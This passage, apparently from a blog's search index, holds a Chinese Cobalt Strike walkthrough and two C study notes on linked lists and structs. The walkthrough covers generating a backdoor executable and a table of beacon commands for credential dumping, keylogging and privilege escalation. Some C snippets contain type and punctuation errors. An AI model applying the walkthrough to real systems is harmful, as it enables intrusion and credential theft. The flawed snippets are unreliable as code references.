  # 提供一个文件下载，可以修改Mime信息； 可以配合DNS欺骗实现挂马效果使用\n    -- Script Web Delivery  # 类似于msf 的web_delivery \n    -- Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击\n    -- Smart Applet Attack  #自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；\n    -- System Profiler # 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。\n Spear Phish       #钓鱼攻击\n\nReporting（报告）\n\n3.利用CS生成木马1.打开监听器模块，点击add添加新的监听器。\n\n2.依照箭头配置完成后save保存，用户名随意。\n\n监听器参数：\nname\t                # 为监听器名字，可任意\npayload\t                # payload类型\nHTTP Hosts\t        # shell反弹的主机，也就是我们 CS 服务器的 IP\nHTTP Hosts(Stager)\t# Stager的马请求下载payload的地址\nHTTP Port(C2)\t        # C2监听的端口\n# Cobaltstrike 4.1 版本提供了 8 种监听器\n\nbeacon_xx 系列为 Cobalt Strike 自身内置的监听器，\n即在目标主机执行相应的payload，获取 shell 到 CS 上，\n包括 dns、http、https、smb 四种方式的监听器；\n\nforeign 系列为外部监听器，通常与 MSF 或者 Armitage 联动，\n例如获取 meterpreter 到 MSF上。\n\n3.找到攻击模块-&gt;生成后门，选择Windows Executable。\n\n4.选择创建好的监听器。\n\n5.点击generate创建，选择创建木马的保存路径，生成artifact.exe木马文件。\n6.目标主机运行木马后，成功上线。\n\nInteract  # 互交窗口\n&#39;&#39;&#39;\nBeacon\n成功将所控制的目标机资源上线之后，团队内的其他成员即可对该台机器进行进一步渗透。\n团队成员通过点击目标机右键，选择 Interact 功能（进入 beacon），就可以用它来执行各种命令，开始对目标及进行操作。\n进一步可用help+命令的方式查看具体命令参数说明。\n\n【注意】\n1. 在 Cobalt Strike 中，默认心跳为 60s（即 CS 与受害机默认 60s 才进行一次交互），故执行命令的响应速度很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。在这里执行命令 sleep 5 可以把交互时间设置为 5 秒。\n2. 同时在 beacon 中，如果想对目标进行命令管理，需要在前面加上shell关键词，如shell whoami、shell ipconfig等。\n&#39;&#39;&#39;\n\n\nAccess   \n    -- Dump Hashes  #  获取hash（只能权限为administor使用）\n    -- elevate      #提权\n    -- Golden Ticket #生成黄金票据注入当前会话\n    -- Make Token    # 凭证转换\n    -- One-liner    # 反弹shell\n    -- Run Mimikatz # 运行 Mimikatz\n    --Spawn As  #用其他用户生成Cobalt Strike的beacon\nExplore\n    -- Browser Pivot  #  劫持目标浏览器进程并代理\n    -- Destop Vnc   # 桌面互交\n    -- File Browser # 文件浏览器\n    -- Net View     # 网络列表\n    -- Port Scan    # 端口扫描\n    -- Process List # 进程列表\n    -- Screenshot   # 截图\nPrivoting\n    -- SOCKS Server # 代理服务\n    -- Listener     # 反向端口转发\n    -- Deploy VPN   # 部署VPN\nSpawn   #新的通讯模式并生成会话\nSession     #会话管理，删除，心跳时间，退出，备注\n\nBeacon Commands\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n    Command                   Description\n    -------                   -----------\n    argue                     进程参数欺骗\n    blockdlls                 在子进程中阻止非Microsoft的DLLs文件\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   通过TCP连接到Beacon\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n    execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  对当前令牌启用系统权限\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      通过命名管道连接到Beacon\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      给当前目标机器备注       \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      为生成的post-ex任务设置父PID\n    ps                        显示进程列表\n    psexec                    使用服务在主机上生成会话\n    psexec_psh                使用PowerShell在主机上生成会话\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       查询注册表\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      在另一个PID下执行程序\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     生成一个会话 \n    spawnas                   以其他用户身份生成会话\n    spawnto                   将可执行程序注入进程\n    spawnu                    在另一个PID下生成会话\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    断开与Beacon的连接\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话","slug":"cs","date":"2023-04-30T12:30:34.000Z","categories_index":"文章","tags_index":"渗透工具","author_index":"南瓜の无名"},{"id":"a6f0cc9299816c24b5762d16aaeb2235","title":"c语言学习笔记_02单链表","content":"单链表链表是一种常见的数据结构。根据需求，我们可以构造出单链表、双链表、循环链表和块状链表等。链表的出现很大程度上弥补了数组的先天不足。\n\nstruct Test\n&#123;\n    int x;\n    int y;\n    struct Test *test;\n&#125;;\n\n\n在单链表中插入元素\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;    \n        &#x2F;&#x2F; 首先，将 *library 的值赋给 temp，保存了链表的头部节点。\n        *library &#x3D; book;    \n        &#x2F;&#x2F; 将 book 的地址赋给 *library，即将新的书籍节点作为链表的新头部节点。\n        book-&gt;next &#x3D; temp;\n        &#x2F;&#x2F; 将 temp 赋给 book-&gt;next，即将原来的链表头部节点作为新的书籍节点的下一个节点。\n    &#125;\n    else\n    &#123;\n        *library &#x3D; *book;\n        &#x2F;&#x2F; *library &#x3D; *book; 将 book 的值赋给 *library，即将新的书籍节点作为链表的第一个节点。\n\n        book-&gt;next &#x3D; NULL;\n        &#x2F;&#x2F; book-&gt;next &#x3D; NULL; 将新的书籍节点的下一个节点指针 next 设置为 NULL，表示链表只有一个节点。\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       temp &#x3D; *library;\n       &#x2F;&#x2F; 定位单链表的尾部位置\n       while (temp-&gt;next !&#x3D; NULL)\n       &#123;\n            temp &#x3D; temp-&gt;next;\n       &#125;\n       &#x2F;&#x2F; 插入数据\n       temp-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n搜索单链表#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nstruct Book *searchBook(struct Book *library, char *target);\nvoid printBook(struct Book *book);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nstruct Book *searchBook(struct Book *library, char *target)\n&#123;\n    struct Book *book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        if (!strcmp(book-&gt;title, target) || !strcmp(book-&gt;author, target))\n        &#123;\n            break;\n        &#125;\n        book &#x3D; book-&gt;next;\n    &#125;\n    return book;\n&#125;\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    struct Book *book;\n    char input[128];\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        getchar();\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do\n    &#123;\n        ch &#x3D; getchar();\n    &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n    getchar();\n\n    if (ch &#x3D;&#x3D; &#39;Y&#39;)\n    &#123;\n        printLibrary(library);\n    &#125;\n    printf(&quot;\\n请输入书名或作者：&quot;);\n    scanf(&quot;%s&quot;, input);\n\n    book &#x3D; searchBook(library, input);\n    if(book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;很抱歉，没能找到！\\n&quot;);\n    &#125;\n    else\n    &#123;\n        do\n        &#123;\n            printf(&quot;已找到符合条件的图书...\\n&quot;);\n            printBook(book);\n        &#125; while (searchBook(book-&gt;next, input) !&#x3D; NULL);\n    &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n单链表的优势\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;  \n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nvoid deleteNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value !&#x3D; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n    if(current &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;找不到匹配的节点!\\n&quot;);\n        return;\n    &#125;\n    else\n    &#123;\n        if(previous &#x3D;&#x3D; NULL)\n        &#123;\n            *head &#x3D; current-&gt;next;\n        &#125;\n        else\n        &#123;\n            previous-&gt;next &#x3D; current-&gt;next;\n        &#125;\n        free(current);\n    &#125;\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    printf(&quot;开始测试插入整数...\\n&quot;);\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    printf(&quot;开始测试删除整数...\\n&quot;);\n     while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        deleteNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;","slug":"c语言_02","date":"2023-04-24T01:50:13.000Z","categories_index":"学习笔记","tags_index":"c语言基础","author_index":"南瓜の无名"},{"id":"a92f95749a1c85a9800c2a62de3c6bb6","title":"c语言学习笔记_01结构体","content":"结构体结构体声明struct 结构体名称\n&#123;\n    结构体成员1;\n    结构体成员2;\n    结构体成员3;\n&#125;;\n\n例：\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125;;\n\n定义结构体类型变量struct 结构体名称 结构体变量名\n\n#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    &#x2F;&#x2F; struct Book book;\n\n    return 0;\n&#125;\n\n\n访问结构体变量#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d&quot;, &amp;book.date);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    printf(&quot;\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;数据录入完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n&quot;);\n\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d\\n&quot;, book.date);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n初始化结构体变量struct Book book &#x3D; &#123;\n    &quot;书名&quot;,           &#x2F;&#x2F; char title[128];\n    &quot;作者&quot;,           &#x2F;&#x2F; char author[40];\n    48.8,            &#x2F;&#x2F; float price;\n    20221212,        &#x2F;&#x2F; unsigned int date;\n    &quot;出版社&quot;         &#x2F;&#x2F; char publisher[40];\n&#125;;\n\n初始化结构体的指定成员值struct Book book &#x3D; &#123;\n    .price &#x3D; 48.8,\n    .publisher &#x3D; &quot;出版社&quot;,\n    .date &#x3D; 20221212\n&#125;;\n\n例题#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        int b;\n        char c;\n    &#125; a &#x3D; &#123;&#39;x&#39;, 520, &#39;o&#39;&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 4 1 -&gt; 4 4 4\n\n#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        char c;\n        int b; \n    &#125; a &#x3D; &#123;&#39;x&#39;, &#39;o&#39;, 520&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 1 4 -&gt; 4 4 \n\n结构体嵌套#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d-%d-%d\\n&quot;, book.date.year, book.date.month, book.date.day);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n结构体数组· 第一种方法是在声明结构体的时候进行定义：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125; 数组名[长度];\n\n· 第二种方法是先声明一个结构体类型（比如上面的Book），再用此类型定义一个结构体数组：\n&#x2F;&#x2F; struct 结构体名称\n&#x2F;&#x2F; &#123;\n&#x2F;&#x2F;     结构体成员;\n&#x2F;&#x2F; &#125;;\n&#x2F;&#x2F; struct 结构体名称 数组名[长度];\n\n结构体指针struct Book * pt;\npt &#x3D; &amp;book;\n\n通过结构体指针访问结构体成员有两种方法：\n(*结构体指针).成员名\n结构体指针-&gt;成员名\n\n#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char publisher[40];\n&#125; book &#x3D; &#123;\n    &quot;书名&quot;，\n    &quot;作者&quot;,\n    48.8,\n    &#123;2022，12，12&#125;,\n    &quot;出版社&quot;\n&#125;;\n\nint main(void)\n&#123;\n    struct Book *pt;\n    pt &#x3D; &amp;book;\n\n    printf(&quot;书名：%s\\n&quot;, (*pt).title);\n    